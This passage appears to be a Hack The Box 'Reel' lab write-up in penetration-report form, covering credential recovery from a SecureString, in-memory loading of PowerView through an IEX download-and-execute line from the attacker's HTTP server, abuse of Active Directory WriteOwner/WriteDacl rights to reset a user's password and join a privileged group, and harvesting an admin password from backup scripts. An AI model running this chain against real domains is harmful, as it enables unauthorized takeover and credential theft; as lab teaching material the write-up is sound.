I proceed to uncover what appears to be a password string

```
PS C:\Users\nico\Desktop> $pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692' | convertto-securestring
PS C:\Users\nico\Desktop> $user = 'HTB\tom'
PS C:\Users\nico\Desktop> $cred = New-Object System.Management.Automation.PSCredential $user,$pass
PS C:\Users\nico\Desktop> $cred.getnetworkcredential() | fl


UserName       : tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

With SSH open I gain access using tom's credentials

```
┌──[Thu Nov 10 09:30:59 AM CST 2022]-[TheScriptKid]-[/opt/winreconpack]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.47.91]
└──# ssh tom@$ip                                                                                                                                            1 ⨯
tom@10.129.47.91's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

tom@REEL C:\Users\tom>powershell                                                                                                
Windows PowerShell                                                                                                              
Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  

PS C:\Users\tom>
```

Before enumerating the active directory domain I will load PowerView, a powershell tool, in memory.

```
┌──[Tue Nov  8 10:47:39 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# python3 -m http.server 80 -d /opt/winreconpack
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

{% code overflow="wrap" %}
```
PS C:\Users\tom> IEX (New-Object Net.Webclient).downloadstring("http://10.10.16.2/powerview.ps1")
```
{% endcode %}

```
┌──[Tue Nov  8 10:47:39 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# python3 -m http.server 80 -d /opt/winreconpack
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.15.19 - - [08/Nov/2022 22:49:14] "GET /powerview.ps1 HTTP/1.1" 200 -

```

I begin checking for non-default groups with one being of interest is the backup\_admins group

```
PS C:\Users\tom> get-netgroup                                                                                                   
...                                                                                                       
Backup_Admins
AppLocket_Test                                                                                                                 
SharePoint_Admins                                                                                                               
DR_Site                                                                                                                         
SQL_Admins                                                                                                                      
HelpDesk_Admins                                                                                                                 
Restrictions                                                                                                                    
All_Staff                                                                                                                       
MegaBank_Users                                                                                                                  
Finance_Users                                                                                                                   
HR_Team                                                                                                                  
```

I look into what users/group and the permissions associated and I see that claire has an interesting permission of WriteDacl

```
PS C:\Users\tom> get-objectacl -SamAccountName "Backup_Admins" -ResolveGUIDs


InheritedObjectType   : All                                                                                                     
ObjectDN              : CN=Backup_Admins,OU=Groups,DC=HTB,DC=LOCAL                                                              
ObjectType            : All                                                                                                     
IdentityReference     : HTB\claire                                                                                              
IsInherited           : False                                                                                                   
ActiveDirectoryRights : ReadProperty, WriteProperty, GenericExecute, WriteDacl                                                  
PropagationFlags      : None                                                                                                    
ObjectFlags           : None                                                                                                    
InheritanceFlags      : ContainerInherit                                                                                        
InheritanceType       : All                                                                                                     
AccessControlType     : Allow                                                                                                   
ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1135
```

I proceed into searching for tom's user who may have object access to claire's user. According to the output tom has WriteOwner permissions to claire.

```
PS C:\Users\tom> Get-ObjectAcl -SamAccountName "claire" -ResolveGUIDs


InheritedObjectType   : All                                                                                                     
ObjectDN              : CN=Claire Danes,CN=Users,DC=HTB,DC=LOCAL                                                                
ObjectType            : All                                                                                                     
IdentityReference     : HTB\tom                                                                                                 
IsInherited           : False                                                                                                   
ActiveDirectoryRights : WriteOwner                                                                                              
PropagationFlags      : None                                                                                                    
ObjectFlags           : None                                                                                                    
InheritanceFlags      : None                                                                                                    
InheritanceType       : None                                                                                                    
AccessControlType     : Allow                                                                                                   
ObjectSID             : S-1-5-21-2648318136-3688571242-2924127574-1130
```

With this information I can abuse the WriteOwner and WriteDacl permissions as follows

```
PS C:\Users\tom> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights all                                  
PS C:\Users\tom> $UserPassword = ConvertTo-SecureString '@Password!23' -AsPlainText -Force                                      
PS C:\Users\tom> Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword                                         
PS C:\Users\tom> $Cred = New-Object System.Management.Automation.PSCredential('HTB\claire', $UserPassword)                      
PS C:\Users\tom> Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $Cred
```

Now I can see claire under the Backup\_Admins group

```
PS C:\Users\tom> net user claire /domain                                                                                        
User name                    claire                                                                                             
Full Name                    Claire Danes                                                                                       
Comment                                                                                                                         
User's comment                                                                                                                  
Country/region code          000 (System Default)                                                                               
Account active               Yes                                                                                                
Account expires              Never                                                                                              

Password last set            11/10/2022 5:13:11 PM                                                                              
Password expires             Never                                                                                              
Password changeable          11/11/2022 5:13:11 PM                                                                              
Password required            Yes                                                                                                
User may change password     Yes                                                                                                

Workstations allowed         All                                                                                                
Logon script                                                                                                                    
User profile                                                                                                                    
Home directory                                                                                                                  
Last logon                   11/10/2022 5:13:24 PM                                                                              

Logon hours allowed          All                                                                                                

Local Group Memberships      *Hyper-V Administrator                                                                             
Global Group memberships     *Backup_Admins        *Domain Users                                                                
                             *MegaBank_Users       *DR_Site                                                                     
                             *Restrictions                                                                                      
The command completed successfully.
```

With claire's password changed I now gain access as claire using SSH

```
┌──[Thu Nov 10 11:14:40 AM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# ssh claire@10.129.47.91                                                                                                                              130 ⨯
claire@10.129.47.91's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

claire@REEL C:\Users\claire>
```

With claire's permissions I am able to view the administrator's directory. Furthermore, I encounter a Backup Scripts directory that includes interesting files, powershell scripts.

```
claire@REEL C:\Users\Administrator\Desktop>cd "Backup Scripts"                                                                  

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir                                                                   
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of C:\Users\Administrator\Desktop\Backup Scripts                                                                     

11/02/2017  09:47 PM    <DIR>          .                                                                                        
11/02/2017  09:47 PM    <DIR>          ..                                                                                       
11/03/2017  11:22 PM               845 backup.ps1                                                                               
11/02/2017  09:37 PM               462 backup1.ps1                                                                              
11/03/2017  11:21 PM             5,642 BackupScript.ps1                                                                         
11/02/2017  09:43 PM             2,791 BackupScript.zip                                                                         
11/03/2017  11:22 PM             1,855 folders-system-state.txt                                                                 
11/03/2017  11:22 PM               308 test2.ps1.txt                                                                            
               6 File(s)         11,903 bytes                                                                                   
               2 Dir(s)  15,594,967,040 bytes free
```

My initial thought is to search for passwords in these scripts and what looks to be the administrator is revealed

```
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>findstr /si password *.ps1                                            
BackupScript.ps1:# admin password                                                                                               
BackupScript.ps1:$password="Cr4ckMeIfYouC4n!"
```

I attempt to SSH into the administrator user with these credentials and gain administrator access

```
┌──[Thu Nov 10 01:50:51 PM CST 2022]-[TheScriptKid]-[/tmp]
├──[wlan0: 192.168.1.153]-[tun0: 10.10.16.2]-[ip: 10.129.15.19]
└──# ssh administrator@10.129.47.91
administrator@10.129.47.91's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

administrator@REEL C:\Users\Administrator>
```



**Vulnerability Exploited: Insecure Access Control Lists**

**Vulnerability Explanation:** W**eak permissions of Active Directory Discretionary Access Control Lists (DACLs) and Acccess Control Entries (ACEs) that make up DACLs.**

**Vulnerability Fix: Remove Unesescary Permissions To Prevent Compromise**

**Severity: Critical**

**Proof Screenshot Here:**

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p><strong>Root.txt</strong></p></figcaption></figure>

**Proof.txt Contents:**

```
administrator@REEL C:\Users\Administrator\Desktop>hostname && whoami && type root.txt && ipconfig /all                          
REEL                                                                                                                            
htb\administrator                                                                                                               
1018a0331e686176ff4577c728eaf32a                                                                                                
Windows IP Configuration                                                                                                        

   Host Name . . . . . . . . . . . . : REEL                                                                                     
   Primary Dns Suffix  . . . . . . . : HTB.LOCAL                                                                                
   Node Type . . . . . . . . . . . . : Hybrid                                                                                   
   IP Routing Enabled. . . . . . . . : No                                                                                       
   WINS Proxy Enabled. . . . . . . . : No                                                                                       
   DNS Suffix Search List. . . . . . : HTB.LOCAL                                                                                
                                       htb                                                                                      

Ethernet adapter Ethernet0 2:                                                                                                   

   Connection-specific DNS Suffix  . : .htb                                                                                     
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter                                                                 
   Physical Address. . . . . . . . . : 00-50-56-B9-C6-68                                                                        
   DHCP Enabled. . . . . . . . . . . : Yes                                                                                      
   Autoconfiguration Enabled . . . . : Yes                                                                                      
   IPv6 Address. . . . . . . . . . . : dead:beef::56(Preferred)                                                                 
   Lease Obtained. . . . . . . . . . : 10 November 2022 06:18:13                                                                
   Lease Expires . . . . . . . . . . : 10 November 2022 22:45:49                                                                
   IPv6 Address. . . . . . . . . . . : dead:beef::66:2c96:a520:b43b(Preferred)                                                  
   Link-local IPv6 Address . . . . . : fe80::66:2c96:a520:b43b%14(Preferred)                                                    
   IPv4 Address. . . . . . . . . . . : 10.129.47.91(Preferred)                                                                  
   Subnet Mask . . . . . . . . . . . : 255.255.0.0                                                                              
   Lease Obtained. . . . . . . . . . : 10 November 2022 06:18:24                                                                
   Lease Expires . . . . . . . . . . : 10 November 2022 22:48:24                                                                
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%14                                                              
                                       10.129.0.1                                                                               
   DHCP Server . . . . . . . . . . . : 10.129.0.1                                                                               
   DHCPv6 IAID . . . . . . . . . . . : 335564886                                                                                
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-22-AD-9E-CA-00-50-56-B9-50-75                                                
   DNS Servers . . . . . . . . . . . : 1.1.1.1                                                                                  
                                       8.8.8.8                                                                                  
   NetBIOS over Tcpip. . . . . . . . : Enabled                                                                                  
   Connection-specific DNS Suffix Search List :                                                                                 
                                       htb                                                                                      

Tunnel adapter isatap..htb:                                                                                                     

   Media State . . . . . . . . . . . : Media disconnected                                                                       
   Connection-specific DNS Suffix  . : .htb                                                                                     
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2                                                              
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0                                                                  
   DHCP Enabled. . . . . . . . . . . : No                                                                                       
   Autoconfiguration Enabled . . . . : Yes                                                                                      

administrator@REEL C:\Users\Administrator\Desktop>
```

### Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

### House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting data from the network was completed, I removed all user accounts and passwords as well as the Meterpreter services installed on the system. the client should not have to remove any user accounts or services from the system.

## Additional Items

### Appendix - Proof and Local Contents

| IP (Hostname) | Local.txt Contents               | Proof.txt Contents               |
| ------------- | -------------------------------- | -------------------------------- |
| 10.129.47.91  | b38b9329fcdc4ea8887eb109c05c8afd | b2e35251f711471d971e9a660604353d |

### Appendix - Bagde

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
